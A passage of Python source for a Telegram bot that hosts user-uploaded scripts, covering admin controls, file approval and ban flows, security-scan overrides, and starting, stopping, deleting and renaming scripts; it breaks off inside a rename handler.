                for uid_folder, mtime, size in idle[:30]:
                    total_size += size
                    age_days = int((time.time() - mtime) / 86400)
                    lines.append(f"👤 <code>{uid_folder}</code> — idle {age_days}d — {_human_size(size)}")
                lines.append(f"\n💾 Total reclaimable: <code>{_human_size(total_size)}</code>")
                text = "\n".join(lines)
                if len(text) > 4000:
                    text = text[:3900] + "\n…(truncated)"
                bot.send_message(call.message.chat.id, text, parse_mode='HTML')

        elif data == 'add_admin':
            if user_id != OWNER_ID:
                bot.answer_callback_query(call.id, "Owner only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "Enter User ID to promote, or /cancel.")
            bot.register_next_step_handler(msg, _process_add_admin)

        elif data == 'remove_admin':
            if user_id != OWNER_ID:
                bot.answer_callback_query(call.id, "Owner only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "Enter Admin ID to remove, or /cancel.")
            bot.register_next_step_handler(msg, _process_remove_admin)

        elif data == 'list_admins':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            lines = [f"• <code>{aid}</code> {'👑 Owner' if aid == OWNER_ID else '🛡️ Admin'}" for aid in sorted(admin_ids)]
            text  = f"🛡️ <b>Admin List</b> — {len(admin_ids)} total\n\n" + "\n".join(lines)
            try:
                bot.edit_message_text(
                    text,
                    call.message.chat.id, call.message.message_id,
                    reply_markup=create_admin_panel_markup(), parse_mode='HTML'
                )
            except telebot.apihelper.ApiTelegramException as e:
                if "not modified" not in str(e).lower():
                    raise

        elif data == 'lock_bot':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot_locked = True
            log_audit(user_id, 'lock_bot', '')
            bot.answer_callback_query(call.id, "🔒 Bot locked")
            try:
                bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                              reply_markup=create_main_menu(user_id))
            except Exception: pass

        elif data == 'unlock_bot':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot_locked = False
            log_audit(user_id, 'unlock_bot', '')
            bot.answer_callback_query(call.id, "🔓 Bot unlocked")
            try:
                bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                              reply_markup=create_main_menu(user_id))
            except Exception: pass

        elif data == 'run_all_scripts':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            _logic_run_all_scripts(call)

        elif data == 'backup_db':
            _logic_backup_db(call)

        elif data == 'subscription':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            bot.edit_message_text("💳 <b>Subscription Manager</b>",
                call.message.chat.id, call.message.message_id,
                reply_markup=create_subscription_menu(), parse_mode='HTML')

        elif data == 'add_subscription':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id,
                "Enter <code>USER_ID DAYS</code> (e.g. <code>123456789 30</code>), or /cancel.", parse_mode='HTML')
            bot.register_next_step_handler(msg, _process_add_subscription)

        elif data == 'remove_subscription':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id,
                "Enter User ID to remove subscription, or /cancel.")
            bot.register_next_step_handler(msg, _process_remove_subscription)

        elif data == 'check_subscription':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id,
                "Enter User ID to check, or /cancel.")
            bot.register_next_step_handler(msg, _process_check_subscription)

        elif data == 'broadcast':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            _logic_broadcast_init(call.message)

        elif data == 'broadcast_text':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            msg = bot.send_message(
                call.message.chat.id,
                "📝 <b>Text Broadcast</b>\n\nSend your message text now, or /cancel.",
                parse_mode='HTML'
            )
            bot.register_next_step_handler(msg, process_text_broadcast)

        elif data == 'broadcast_photo':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            msg = bot.send_message(
                call.message.chat.id,
                "🖼️ <b>Photo Broadcast</b>\n\nSend a photo (with optional caption) to broadcast, or /cancel.",
                parse_mode='HTML'
            )
            bot.register_next_step_handler(msg, process_photo_broadcast)

        elif data == 'toggle_auto_approve':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            _logic_toggle_auto_approve(user_id, call.message.chat.id)
            try:
                bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                              reply_markup=create_admin_panel_markup())
            except Exception: pass
            # Also refresh any open main menu — rebuild it in a new message
            try:
                aa_state = "✅ ON" if auto_approve_enabled else "❌ OFF"
                bot.send_message(
                    call.message.chat.id,
                    f"🔄 Auto-Approve is now <b>{aa_state}</b>.\n"
                    f"Main menu updated — use /start to refresh.",
                    parse_mode='HTML',
                    reply_markup=create_main_menu(user_id)
                )
            except Exception: pass

        elif data == 'toggle_daily_msg':
            if user_id not in admin_ids:
                bot.answer_callback_query(call.id, "Admin only.", show_alert=True); return
            bot.answer_callback_query(call.id)
            _logic_toggle_daily_msg(user_id, call.message.chat.id)
            try:
                bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                              reply_markup=create_admin_panel_markup())
            except Exception: pass

        elif data == 'show_upgrades':
            bot.answer_callback_query(call.id)
            _send_upgrades_info(call.message.chat.id)

        elif data == 'suggest_upgrade':
            bot.answer_callback_query(call.id)
            msg = bot.send_message(
                call.message.chat.id,
                "💡 <b>Suggest an Upgrade</b>\n\n"
                "Type your suggestion/feature request below and it will be "
                "forwarded directly to the owner and admins.\n\n"
                "Send /cancel to cancel.",
                parse_mode='HTML'
            )
            bot.register_next_step_handler(msg, _handle_upgrade_suggestion)

        elif data.startswith('confirm_broadcast_'):
            _cb_confirm_broadcast(call)

        elif data == 'cancel_broadcast':
            bot.answer_callback_query(call.id, "Broadcast cancelled.")
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except Exception: pass

        else:
            bot.answer_callback_query(call.id, "Unknown action.")

    except Exception as e:
        logger.error(f"Callback error [{data}]: {e}", exc_info=True)
        try:
            bot.answer_callback_query(call.id, "⚠️ Error processing action.", show_alert=True)
        except Exception:
            pass

def _parse_action(data, prefix):
    rest = data[len(prefix):]
    uid_str, _, fname = rest.partition('_')
    return int(uid_str), fname

def _check_admin_or_owner(call):
    if call.from_user.id not in admin_ids:
        bot.answer_callback_query(call.id, "Admin only.", show_alert=True)
        return False
    return True

# ── Upgrade 3: inline rescan callback ────────────────────────────────────────

def _cb_rescan_file(call):
    """Runs scanner on a file inline from the file-controls view."""
    try:
        uid, fname = _parse_action(call.data, 'rescanfile_')
        requester  = call.from_user.id
        if requester != uid and requester not in admin_ids:
            bot.answer_callback_query(call.id, "Permission denied.", show_alert=True); return

        folder = get_user_folder(uid)
        fpath  = os.path.join(folder, fname)
        if not os.path.exists(fpath):
            bot.answer_callback_query(call.id, "File not found on disk.", show_alert=True); return

        code = _read_script_content(fpath)
        if not code:
            bot.answer_callback_query(call.id, "Cannot read file.", show_alert=True); return

        result = scan_script_for_threats(code, fname)
        report = _format_scan_result(result, fname)

        mk = types.InlineKeyboardMarkup(row_width=2)
        if result['blocked'] and requester in admin_ids:
            mk.add(
                _btn("✅ Override & Approve", "success", _cb('scanoverride_', uid, fname)),
                _btn("🗑️ Delete & Ban",       "danger",  _cb('scandelete_',  uid, fname)),
            )
        mk.add(_btn("🔙 Back", "gray", _cb('file_', uid, fname)))

        bot.answer_callback_query(call.id, "🔍 Scan complete")
        bot.send_message(
            call.message.chat.id,
            f"🔍 <b>Scan Result</b>  📄 <code>{_esc(fname)}</code>\n\n{report}",
            reply_markup=mk, parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"_cb_rescan_file: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

# ── Upgrade 1: scan rule toggle callback ─────────────────────────────────────

def _cb_scanrule_toggle(call):
    """Toggle a single scan rule on or off."""
    if not _check_admin_or_owner(call): return
    try:
        idx = int(call.data.split('_')[-1])
    except (ValueError, IndexError):
        bot.answer_callback_query(call.id, "Invalid rule index.", show_alert=True); return

    all_rules = _all_scan_rule_labels()
    if idx < 0 or idx >= len(all_rules):
        bot.answer_callback_query(call.id, "Rule not found.", show_alert=True); return

    label, severity = all_rules[idx]
    if label in _disabled_scan_labels:
        _disabled_scan_labels.discard(label)
        state = "✅ Enabled"
    else:
        _disabled_scan_labels.add(label)
        state = "❌ Disabled"

    _save_disabled_scan_labels()
    bot.answer_callback_query(call.id, f"{state}: {label[:40]}")
    # Refresh the panel on the same page
    page = idx // 8
    _send_scan_rules_panel(call.message.chat.id, page)

def _cb_approve(call):
    if not _check_admin_or_owner(call): return
    try:
        uid, fname = _parse_action(call.data, 'approve_')
        if update_file_status(uid, fname, FILE_STATUS_APPROVED, call.from_user.id):
            try:
                bot.send_message(uid,
                    f"✅ <b>File Approved!</b>\n\n"
                    f"📄 <code>{fname}</code> is ready to run.\n"
                    f"Go to <b>📂 My Files</b> to start it.",
                    parse_mode='HTML')
            except Exception: pass
            bot.answer_callback_query(call.id, "✅ Approved!")
            try:
                bot.edit_message_text(
                    f"✅ <b>APPROVED</b>\n📄 <code>{fname}</code>\n👤 <code>{uid}</code>\n🛡️ By <code>{call.from_user.id}</code>",
                    call.message.chat.id, call.message.message_id, parse_mode='HTML')
            except Exception: pass
        else:
            bot.answer_callback_query(call.id, "Not found in DB.", show_alert=True)
    except Exception as e:
        logger.error(f"_cb_approve: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_reject(call):
    if not _check_admin_or_owner(call): return
    try:
        uid, fname = _parse_action(call.data, 'reject_')
        if update_file_status(uid, fname, FILE_STATUS_REJECTED, call.from_user.id):
            try:
                bot.send_message(uid,
                    f"❌ <b>File Rejected</b>\n\n"
                    f"📄 <code>{fname}</code> was rejected by admin.\n"
                    f"Upload a clean version or contact admin.",
                    parse_mode='HTML')
            except Exception: pass
            bot.answer_callback_query(call.id, "❌ Rejected")
            try:
                bot.edit_message_text(
                    f"❌ <b>REJECTED</b>\n📄 <code>{fname}</code>\n👤 <code>{uid}</code>\n🛡️ By <code>{call.from_user.id}</code>",
                    call.message.chat.id, call.message.message_id, parse_mode='HTML')
            except Exception: pass
    except Exception as e:
        logger.error(f"_cb_reject: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_ban(call):
    if not _check_admin_or_owner(call): return
    try:
        uid, fname = _parse_action(call.data, 'ban_')
        ban_file(uid, fname, call.from_user.id, reason="Banned by admin")
        log_audit(call.from_user.id, 'ban_file', f"user={uid} file={fname}")
        bot.answer_callback_query(call.id, "🔨 Banned!")
        try:
            bot.edit_message_text(
                f"🚫 <b>BANNED</b>\n📄 <code>{fname}</code>\n👤 <code>{uid}</code>\n🛡️ By <code>{call.from_user.id}</code>",
                call.message.chat.id, call.message.message_id, parse_mode='HTML')
        except Exception: pass
    except Exception as e:
        logger.error(f"_cb_ban: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_scan_override(call):
    """Admin overrides a scan-blocked file — marks it approved so the user can run it."""
    if not _check_admin_or_owner(call): return
    try:
        uid, fname = _parse_action(call.data, 'scanoverride_')
        fs = get_file_status(uid, fname)
        if fs['status'] not in (FILE_STATUS_BANNED,):
            bot.answer_callback_query(call.id,
                f"File status is '{fs['status']}', not banned. No change needed.",
                show_alert=True)
            return

        # Snapshot the original ban reason BEFORE clearing it
        original_reason = fs.get('ban_reason') or "No reason recorded"

        update_file_status(uid, fname, FILE_STATUS_APPROVED, call.from_user.id,
                           ban_reason=None)
        bot.answer_callback_query(call.id, "✅ Override applied — file approved!")
        try:
            bot.edit_message_text(
                f"✅ <b>SCAN OVERRIDE — APPROVED</b>\n\n"
                f"📄 <code>{_esc(fname)}</code>\n"
                f"👤 User: <code>{uid}</code>\n"
                f"🛡️ Overridden by: <code>{call.from_user.id}</code>\n\n"
                f"<i>File is now approved and the user can run it.</i>",
                call.message.chat.id, call.message.message_id, parse_mode='HTML')
        except Exception: pass

        # ── Detailed user notification (exactly what user asked for) ──────
        # Show the user what threats the scanner found AND that admin cleared it.
        if original_reason.startswith("Auto-scan:"):
            threats_raw  = original_reason[len("Auto-scan:"):].strip()
            threats_list = [t.strip() for t in threats_raw.split("|") if t.strip()]
            threat_lines = "\n".join(f"  • {_esc(t)}" for t in threats_list)
            user_msg = (
                f"✅ <b>File Approved — Auto-Scanner Override</b>\n\n"
                f"📄 <code>{_esc(fname)}</code> was <b>previously blocked</b> by the "
                f"automatic security scanner, but has now been <b>manually reviewed and "
                f"approved</b> by an admin.\n\n"
                f"<b>What the scanner flagged:</b>\n{threat_lines}\n\n"
                f"✅ The admin confirmed this is a false positive for your file.\n\n"
                f"Go to <b>📂 My Files</b> to start it now."
            )
        else:
            user_msg = (
                f"✅ <b>File Approved — Override</b>\n\n"
                f"📄 <code>{_esc(fname)}</code> was previously banned, but has now been "
                f"<b>manually reviewed and approved</b> by an admin.\n\n"
                f"<b>Original ban reason:</b> <i>{_esc(original_reason[:200])}</i>\n\n"
                f"Go to <b>📂 My Files</b> to start it now."
            )
        try:
            bot.send_message(uid, user_msg, parse_mode='HTML')
        except Exception: pass
    except Exception as e:
        logger.error(f"_cb_scan_override: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_scan_delete(call):
    """Admin confirms deletion of a scan-blocked file (hard ban — wipes file from disk)."""
    if not _check_admin_or_owner(call): return
    try:
        uid, fname = _parse_action(call.data, 'scandelete_')
        folder = get_user_folder(uid)
        fpath  = os.path.join(folder, fname)
        if os.path.exists(fpath):
            try:
                os.remove(fpath)
            except OSError as e:
                logger.error(f"_cb_scan_delete os.remove: {e}")
        remove_user_file_db(uid, fname)
        update_file_status(uid, fname, FILE_STATUS_BANNED, call.from_user.id,
                           ban_reason="Deleted by admin after scan block")
        bot.answer_callback_query(call.id, "🗑️ File deleted and banned.")
        try:
            bot.edit_message_text(
                f"🗑️ <b>FILE DELETED &amp; BANNED</b>\n\n"
                f"📄 <code>{fname}</code>\n"
                f"👤 User: <code>{uid}</code>\n"
                f"🛡️ By: <code>{call.from_user.id}</code>",
                call.message.chat.id, call.message.message_id, parse_mode='HTML')
        except Exception: pass
        try:
            bot.send_message(
                uid,
                f"🚫 <b>File Permanently Removed</b>\n\n"
                f"📄 <code>{fname}</code> was deleted by an admin after the security scan flagged it.\n"
                f"Contact admin if you believe this is a mistake.",
                parse_mode='HTML')
        except Exception: pass
    except Exception as e:
        logger.error(f"_cb_scan_delete: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_keep(call):
    if not _check_admin_or_owner(call): return
    try:
        uid, fname = _parse_action(call.data, 'keep_')
        bot.answer_callback_query(call.id, "✅ Marked as OK")
        try:
            bot.edit_message_text(
                f"✅ <b>VERIFIED OK</b>\n📄 <code>{fname}</code>\n👤 <code>{uid}</code>\n🛡️ Verified by <code>{call.from_user.id}</code>",
                call.message.chat.id, call.message.message_id, parse_mode='HTML')
        except Exception: pass
    except Exception as e:
        logger.error(f"_cb_keep: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_verify(call):
    if not _check_admin_or_owner(call): return
    try:
        uid, fname = _parse_action(call.data, 'verify_')
        fs      = get_file_status(uid, fname)
        running = is_bot_running(uid, fname)

        script_key = f"{uid}_{fname}"
        si = bot_scripts.get(script_key)
        pid_line = ""
        uptime_line = ""
        if running and si:
            proc = si.get('process')
            pid_line = f"\n│ 🔢 PID: <code>{proc.pid if proc else '?'}</code>"
            st = si.get('start_time')
            if st:
                delta = datetime.now() - st
                h, rem = divmod(int(delta.total_seconds()), 3600)
                m, s   = divmod(rem, 60)
                uptime_line = f"\n│ ⏱️ Running: <code>{h}h {m}m {s}s</code>"

        text = (
            f"🔍 <b>File Verification</b>\n\n"
            f"┌────────────────────\n"
            f"│ 👤 User: <code>{uid}</code>\n"
            f"│ 📄 File: <code>{fname}</code>\n"
            f"│ 🏷️ Type: <code>{fs.get('file_type', '?').upper()}</code>\n"
            f"│ 🔄 Running: {'🟢 Yes' if running else '⚫ No'}"
            f"{pid_line}{uptime_line}\n"
            f"│ 📊 Status: <code>{fs['status'].upper()}</code>\n"
            f"└────────────────────\n\n"
            f"Choose action:"
        )

        mk = types.InlineKeyboardMarkup()
        mk.row(
            _btn("✅ Keep (OK)", "success", _cb('keep_', uid, fname)),
            _btn("🔨 Ban File",  "danger",  _cb('ban_',  uid, fname)),
        )
        if running:
            mk.row(_btn("🔴 Stop Script", "danger", _cb('stop_', uid, fname)))
        mk.row(
            _btn("📜 View Logs",       "primary", _cb('logs_',   uid, fname)),
        )
        mk.add(_btn("🔙 Back to Verify List", "gray", "view_approved"))

        bot.answer_callback_query(call.id)
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=mk, parse_mode='HTML')
    except Exception as e:
        logger.error(f"_cb_verify: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_review(call):
    if not _check_admin_or_owner(call): return
    try:
        uid, fname = _parse_action(call.data, 'review_')
        fs   = get_file_status(uid, fname)
        text = (
            f"📋 <b>File Review</b>\n\n"
            f"👤 User: <code>{uid}</code>\n"
            f"📄 File: <code>{fname}</code>\n"
            f"🏷️ Type: <code>{fs.get('file_type', '?').upper()}</code>\n"
            f"📊 Status: <code>{fs['status'].upper()}</code>\n"
        )
        if fs.get('ban_reason'):
            text += f"⚠️ Reason: <i>{fs['ban_reason']}</i>\n"
        text += "\nChoose action:"

        mk = types.InlineKeyboardMarkup()
        mk.row(
            _btn("✅ Approve", "success", _cb('approve_', uid, fname)),
            _btn("❌ Reject",  "danger",  _cb('reject_',  uid, fname)),
            _btn("🔨 Ban",     "danger",  _cb('ban_',     uid, fname)),
        )
        mk.add(_btn("🔙 Back to Pending", "gray", "view_pending"))
        bot.answer_callback_query(call.id)
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                              reply_markup=mk, parse_mode='HTML')
    except Exception as e:
        logger.error(f"_cb_review: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_check_files(call):
    user_id    = call.from_user.id
    chat_id    = call.message.chat.id
    files_list = user_files.get(user_id, [])
    bot.answer_callback_query(call.id)

    if not files_list:
        mk = types.InlineKeyboardMarkup()
        mk.add(_btn("🔙 Back", "gray", "back_to_main"))
        try:
            bot.edit_message_text("📂 <b>No files yet.</b>\n\nUpload a <code>.py</code>, <code>.js</code>, or <code>.zip</code> to get started.",
                                  chat_id, call.message.message_id,
                                  reply_markup=mk, parse_mode='HTML')
        except Exception: pass
        return

    mk    = types.InlineKeyboardMarkup(row_width=1)
    lines = []
    for fname, ftype in sorted(files_list):
        running = is_bot_running(user_id, fname)
        fs      = get_file_status(user_id, fname)
        a_icon  = _approval_icon(fs['status'])
        r_icon  = "🟢" if running else "⚫"
        mk.add(types.InlineKeyboardButton(
            f"{a_icon} {fname} [{ftype.upper()}] {r_icon}",
            callback_data=_cb('file_', user_id, fname)
        ))
        lines.append(f"{a_icon} <code>{fname}</code> · {ftype.upper()} · {'Running' if running else 'Stopped'}")

    mk.add(_btn("🔙 Back", "gray", "back_to_main"))
    text = f"📂 <b>Your Files ({len(files_list)})</b>\n\n" + "\n".join(lines)
    try:
        bot.edit_message_text(text, chat_id, call.message.message_id,
                              reply_markup=mk, parse_mode='HTML')
    except telebot.apihelper.ApiTelegramException as e:
        if "not modified" not in str(e):
            logger.error(f"_cb_check_files: {e}")

def _cb_file_control(call):
    try:
        uid, fname = _parse_action(call.data, 'file_')
        requester  = call.from_user.id
        if requester != uid and requester not in admin_ids:
            bot.answer_callback_query(call.id, "Permission denied.", show_alert=True); return

        files_list = user_files.get(uid, [])
        finfo = next((f for f in files_list if f[0] == fname), None)
        if not finfo:
            bot.answer_callback_query(call.id, "File not found.", show_alert=True); return

        bot.answer_callback_query(call.id)
        running = is_bot_running(uid, fname)
        fs      = get_file_status(uid, fname)
        ftype   = finfo[1]

        text = (
            f"🖥️ <b>Script Controls</b>\n\n"
            f"📄 <code>{fname}</code> [{ftype.upper()}]\n"
            f"👤 Owner: <code>{uid}</code>\n"
            f"🔄 Running: {'🟢 Yes' if running else '⚫ No'}\n"
            f"📋 Status: {_approval_label(fs['status'])}"
        )
        # ── Upgrade 3: show scan threats / warnings from ban_reason ──────
        ban_reason = fs.get('ban_reason') or ""
        if ban_reason.startswith("Auto-scan:"):
            threats_text = ban_reason[len("Auto-scan:"):].strip()
            text += f"\n\n🚨 <b>Scan Threats:</b>\n"
            for t in threats_text.split(" | "):
                text += f"  • {_esc(t.strip())}\n"
        elif ban_reason:
            text += f"\n⚠️ <i>{_esc(ban_reason)}</i>"

        # Upgrade 3: show last scan warnings from DB if available
        if fs['status'] == FILE_STATUS_APPROVED:
            # Re-run scan inline to show current result
            folder = get_user_folder(uid)
            fpath  = os.path.join(folder, fname)
            code   = _read_script_content(fpath) if os.path.exists(fpath) else None
            if code:
                sr = scan_script_for_threats(code, fname)
                if sr['warnings']:
                    warn_txt = ", ".join(_esc(w) for w in sr['warnings'][:3])
                    text += f"\n⚠️ <b>Scan warnings:</b> {warn_txt}"
                elif sr['clean']:
                    text += "\n✅ <b>Scan:</b> Clean"

        mk = create_file_controls(uid, fname, running)
        # Upgrade 3: Re-Scan Now button
        mk.add(_btn("🔍 Re-Scan Now", "primary", _cb('rescanfile_', uid, fname)))
        if requester in admin_ids and requester != uid:
            mk.add(_btn("🔨 Ban this file", "danger", _cb('ban_', uid, fname)))
        if requester in admin_ids and fs['status'] == FILE_STATUS_BANNED:
            mk.add(_btn("✅ Override & Approve", "success",
                        _cb('scanoverride_', uid, fname)))

        try:
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
                                  reply_markup=mk, parse_mode='HTML')
        except telebot.apihelper.ApiTelegramException as e:
            if "not modified" not in str(e): raise
    except Exception as e:
        logger.error(f"_cb_file_control: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _cb_start_script(call):
    try:
        uid, fname = _parse_action(call.data, 'start_')
        requester  = call.from_user.id
        if requester != uid and requester not in admin_ids:
            bot.answer_callback_query(call.id, "Permission denied.", show_alert=True); return

        finfo = next((f for f in user_files.get(uid, []) if f[0] == fname), None)
        if not finfo:
            bot.answer_callback_query(call.id, "File not found.", show_alert=True); return

        fs = get_file_status(uid, fname)
        if fs['status'] != FILE_STATUS_APPROVED:
            bot.answer_callback_query(call.id,
                f"Not approved yet! Status: {fs['status']}", show_alert=True); return

        if is_bot_running(uid, fname):
            bot.answer_callback_query(call.id, "Already running!", show_alert=True); return

        folder = get_user_folder(uid)
        path   = os.path.join(folder, fname)
        if not os.path.exists(path):
            bot.answer_callback_query(call.id, "File missing on disk. Re-upload.", show_alert=True)
            remove_user_file_db(uid, fname); return

        bot.answer_callback_query(call.id, f"Starting {fname}…")
        runner = run_script if finfo[1] == 'py' else run_js_script
        threading.Thread(target=runner, args=(path, uid, folder, fname, call.message)).start()
        time.sleep(1.5)
        try:
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                          reply_markup=create_file_controls(uid, fname, is_bot_running(uid, fname)))
        except Exception: pass
    except Exception as e:
        logger.error(f"_cb_start_script: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error starting.", show_alert=True)

def _cb_stop_script(call):
    try:
        uid, fname = _parse_action(call.data, 'stop_')
        requester  = call.from_user.id
        if requester != uid and requester not in admin_ids:
            bot.answer_callback_query(call.id, "Permission denied.", show_alert=True); return
        if not is_bot_running(uid, fname):
            bot.answer_callback_query(call.id, "Not running.", show_alert=True); return

        bot.answer_callback_query(call.id, f"Stopping {fname}…")
        key = f"{uid}_{fname}"
        pi  = bot_scripts.get(key)
        if pi:
            kill_process_tree(pi)
            bot_scripts.pop(key, None)
        unmark_script_running(uid, fname)
        # Reset crash counter so manual stop doesn't count as crash
        _crash_counts.pop(key, None)
        try:
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                          reply_markup=create_file_controls(uid, fname, False))
        except Exception: pass
    except Exception as e:
        logger.error(f"_cb_stop_script: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error stopping.", show_alert=True)

def _cb_restart_script(call):
    try:
        uid, fname = _parse_action(call.data, 'restart_')
        requester  = call.from_user.id
        if requester != uid and requester not in admin_ids:
            bot.answer_callback_query(call.id, "Permission denied.", show_alert=True); return

        finfo = next((f for f in user_files.get(uid, []) if f[0] == fname), None)
        if not finfo:
            bot.answer_callback_query(call.id, "File not found.", show_alert=True); return

        fs = get_file_status(uid, fname)
        if fs['status'] != FILE_STATUS_APPROVED:
            bot.answer_callback_query(call.id, f"Not approved. Status: {fs['status']}", show_alert=True); return

        folder = get_user_folder(uid)
        path   = os.path.join(folder, fname)
        if not os.path.exists(path):
            bot.answer_callback_query(call.id, "File missing on disk.", show_alert=True); return

        bot.answer_callback_query(call.id, f"Restarting {fname}…")
        key = f"{uid}_{fname}"
        if is_bot_running(uid, fname):
            pi = bot_scripts.get(key)
            if pi: kill_process_tree(pi)
            bot_scripts.pop(key, None)
            time.sleep(1.5)

        # Reset crash counter on manual restart
        _crash_counts.pop(key, None)

        runner = run_script if finfo[1] == 'py' else run_js_script
        threading.Thread(target=runner, args=(path, uid, folder, fname, call.message)).start()
        time.sleep(1.5)
        try:
            bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id,
                                          reply_markup=create_file_controls(uid, fname, is_bot_running(uid, fname)))
        except Exception: pass
    except Exception as e:
        logger.error(f"_cb_restart_script: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error restarting.", show_alert=True)

def _cb_delete_script(call):
    try:
        uid, fname = _parse_action(call.data, 'delete_')
        requester  = call.from_user.id
        if requester != uid and requester not in admin_ids:
            bot.answer_callback_query(call.id, "Permission denied.", show_alert=True); return

        bot.answer_callback_query(call.id, f"Deleting {fname}…")
        key = f"{uid}_{fname}"
        if is_bot_running(uid, fname):
            pi = bot_scripts.get(key)
            if pi: kill_process_tree(pi)
            bot_scripts.pop(key, None)
            time.sleep(0.5)
        unmark_script_running(uid, fname)
        _crash_counts.pop(key, None)

        folder = get_user_folder(uid)
        for fp in [
            os.path.join(folder, fname),
            os.path.join(folder, f"{os.path.splitext(fname)[0]}.log")
        ]:
            if os.path.exists(fp):
                try: os.remove(fp)
                except OSError as e: logger.error(f"Delete {fp}: {e}")

        remove_user_file_db(uid, fname)
        with DB_LOCK:
            conn = _get_conn(DATABASE_PATH)
            c    = conn.cursor()
            try:
                c.execute('DELETE FROM file_approvals WHERE user_id=? AND file_name=?', (uid, fname))
                conn.commit()
            except Exception: pass
            finally: conn.close()

        try:
            bot.edit_message_text(
                f"🗑️ <code>{fname}</code> deleted successfully.",
                call.message.chat.id, call.message.message_id,
                parse_mode='HTML'
            )
        except Exception: pass
    except Exception as e:
        logger.error(f"_cb_delete_script: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error deleting.", show_alert=True)

def _cb_rename_file(call):
    try:
        uid, fname = _parse_action(call.data, 'rename_')
        requester  = call.from_user.id
        if requester != uid and requester not in admin_ids:
            bot.answer_callback_query(call.id, "Permission denied.", show_alert=True); return

        if is_bot_running(uid, fname):
            bot.answer_callback_query(call.id, "⚠️ Stop the script before renaming.", show_alert=True); return

        bot.answer_callback_query(call.id)
        prompt = bot.send_message(
            call.message.chat.id,
            f"✏️ <b>Rename File</b>\n\n"
            f"Current: <code>{_esc(fname)}</code>\n\n"
            f"Send the new file name (keep the same extension), or /cancel.",
            parse_mode='HTML'
        )
        bot.register_next_step_handler(prompt, _process_rename_file, owner_id=uid, old_name=fname)
    except Exception as e:
        logger.error(f"_cb_rename_file: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error.", show_alert=True)

def _process_rename_file(message, owner_id, old_name):
    raw = (message.text or "").strip()
    if raw.lower() in ('/cancel', 'cancel'):
        bot.reply_to(message, "❌ Rename cancelled.")
        return

    new_name = os.path.basename(raw)
    if not new_name or new_name in ('.', '..'):
        bot.reply_to(message, "❌ Invalid file name.")
        return

    old_ext = os.path.splitext(old_name)[1].lower()
    new_ext = os.path.splitext(new_name)[1].lower()
    if new_ext != old_ext:
        bot.reply_to(message, f"❌ Extension must stay <code>{old_ext}</code>.", parse_mode='HTML')
        return

    if not re.match(r'^[A-Za-z0-9_.\-]+$', new_name):
        bot.reply_to(message, "❌ Only letters, digits, dots, dashes, underscores allowed.")
        return

    folder   = get_user_folder(owner_id)
    old_path = os.path.join(folder, old_name)
    new_path = os.path.join(folder, new_name)

    if not os.path.exists(old_path):
        bot.reply_to(message, "❌ Original file not found.")
        return
    if os.path.exists(new_path):
        bot.reply_to(message, f"❌ <code>{_esc(new_name)}</code> already exists.", parse_mode='HTML')
        return

    finfo = next((f for f in user_files.get(owner_id, []) if f[0] == old_name), None)
    ftype = finfo[1] if finfo else (new_ext.lstrip('.') if new_ext else 'unknown')

    try:
        os.rename(old_path, new_path)
